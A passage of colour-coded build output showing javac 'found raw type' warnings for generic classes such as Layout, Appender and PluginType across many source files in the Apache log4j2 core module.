[2;36m                    [0m         [95mParser.java[0m[39m:[0m[1;39m[[0m[1;36m120[0m[39m,[0m[1;36m20[0m[1;39m][0m[39m found raw type: [0m                                                [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mOutput[0m [2m               [0m
[2;36m                    [0m         [95mStreamManager.java[0m[39m:[0m[1;39m[[0m[1;36m35[0m[39m,[0m[1;36m89[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m      [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFastFi[0m [2m               [0m
[2;36m                    [0m         [95mleManager.java[0m[39m:[0m[1;39m[[0m[1;36m48[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m          [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFastFi[0m [2m               [0m
[2;36m                    [0m         [95mleManager.java[0m[39m:[0m[1;39m[[0m[1;36m73[0m[39m,[0m[1;36m46[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m          [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFastFi[0m [2m               [0m
[2;36m                    [0m         [95mleManager.java[0m[39m:[0m[1;39m[[0m[1;36m171[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFastFi[0m [2m               [0m
[2;36m                    [0m         [95mleManager.java[0m[39m:[0m[1;39m[[0m[1;36m179[0m[39m,[0m[1;36m50[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFileMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m45[0m[39m,[0m[1;36m60[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFileMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m64[0m[39m,[0m[1;36m52[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFileMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m145[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m             [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFileMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m155[0m[39m,[0m[1;36m61[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m             [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m50[0m[39m,[0m[1;36m100[0m[1;39m][0m[39m found raw type: [0m                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m75[0m[39m,[0m[1;36m59[0m[1;39m][0m[39m found raw type: [0m                                   [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m240[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: [0m                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m252[0m[39m,[0m[1;36m34[0m[1;39m][0m[39m found raw type: [0m                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mAbstractSoc[0m [2m               [0m
[2;36m                    [0m         [95mketManager.java[0m[39m:[0m[1;39m[[0m[1;36m54[0m[39m,[0m[1;36m56[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mDatagramSoc[0m [2m               [0m
[2;36m                    [0m         [95mketManager.java[0m[39m:[0m[1;39m[[0m[1;36m46[0m[39m,[0m[1;36m59[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mDatagramSoc[0m [2m               [0m
[2;36m                    [0m         [95mketManager.java[0m[39m:[0m[1;39m[[0m[1;36m57[0m[39m,[0m[1;36m99[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mDatagramSoc[0m [2m               [0m
[2;36m                    [0m         [95mketManager.java[0m[39m:[0m[1;39m[[0m[1;36m90[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mDatagramSoc[0m [2m               [0m
[2;36m                    [0m         [95mketManager.java[0m[39m:[0m[1;39m[[0m[1;36m92[0m[39m,[0m[1;36m69[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m128[0m[39m,[0m[1;36m20[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m141[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m141[0m[39m,[0m[1;36m65[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m228[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m324[0m[39m,[0m[1;36m35[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m439[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m       [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m527[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m560[0m[39m,[0m[1;36m45[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m562[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m605[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m667[0m[39m,[0m[1;36m35[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mBaseConf[0m [2m               [0m
[2;36m                    [0m         [95miguration.java[0m[39m:[0m[1;39m[[0m[1;36m711[0m[39m,[0m[1;36m35[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m47[0m[39m,[0m[1;36m64[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m48[0m[39m,[0m[1;36m61[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m59[0m[39m,[0m[1;36m25[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m59[0m[39m,[0m[1;36m67[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m113[0m[39m,[0m[1;36m12[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m121[0m[39m,[0m[1;36m24[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m151[0m[39m,[0m[1;36m63[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m179[0m[39m,[0m[1;36m85[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m181[0m[39m,[0m[1;36m31[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m183[0m[39m,[0m[1;36m54[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m200[0m[39m,[0m[1;36m64[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m208[0m[39m,[0m[1;36m59[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m209[0m[39m,[0m[1;36m65[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m222[0m[39m,[0m[1;36m43[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m224[0m[39m,[0m[1;36m63[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
